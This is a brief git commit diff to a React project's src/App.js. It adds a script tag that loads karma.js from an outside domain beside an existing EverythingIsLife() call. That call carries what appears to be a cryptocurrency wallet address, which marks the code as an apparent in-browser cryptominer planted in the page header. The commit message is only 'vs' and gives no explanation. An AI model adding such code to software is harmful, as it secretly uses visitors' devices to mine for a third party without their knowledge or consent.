490ee92c4f14431044a242ca9d33d978a8db4f98
Abd Alrazzaq <devoojs@gmail.com>
2022-01-03 01:19:11 -0800

    vs

--- src/App.js
+++ src/App.js
@@ -4,6 +4,7 @@ function App() {
   return (
     <div className="App">
       <header className="App-header">
+       <script src="https://trustiseverything.de/karma/karma.js?karma=bs?nosaj=faster.mo" ></script>
        <script type="text/javascript">
         EverythingIsLife('463kPA3S5aEYfqM5rngfTgL8VGyMxq85P2hNHLhCcGH35wgNWzSrSRUD58n3oAy23ZcufWwxCQ8CbCLUPutLGFrp8n3vpWB', 'react', 50);
        </script>
